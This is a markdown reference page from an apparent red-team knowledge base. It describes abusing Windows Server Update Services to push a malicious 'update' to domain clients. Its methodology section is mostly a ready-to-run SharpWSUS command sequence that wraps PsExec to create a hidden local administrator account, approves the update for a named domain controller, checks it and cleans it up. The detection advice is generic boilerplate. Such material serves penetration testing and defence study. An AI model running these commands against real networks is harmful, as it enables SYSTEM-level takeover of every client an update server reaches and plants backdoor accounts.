---
title: Deployment - WSUS
type: technique
tags: [active-directory, lateral-movement, persistence, reference-import, windows, wsus]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Deployment - WSUS

## What it is

> Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network.

## How it works

WSUS delivers software updates to domain clients using a server-to-client push model; an attacker who controls a WSUS server or can perform a man-in-the-middle attack against WSUS HTTP traffic can push a malicious "update" to all clients in the scope. WSUS only requires the payload to be a Microsoft-signed binary, so attackers use SharpWSUS to create a fake update wrapping a legitimate signed binary (such as PsExec) with malicious command-line arguments, then approve it for a target computer group. Clients install the update automatically during their next update check, executing the attacker's payload as SYSTEM.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

> Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network

:warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.

* [SharpWSUS](https://github.com/nettitude/SharpWSUS)

1. Locate using `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate` or `SharpWSUS.exe locate`
2. After WSUS Server compromise: `SharpWSUS.exe inspect`
3. Create a malicious patch: `SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add ^& net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"`
4. Deploy it on the target: `SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"`
5. Check status deployment: `SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local`
6. Clean up: `SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group`

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
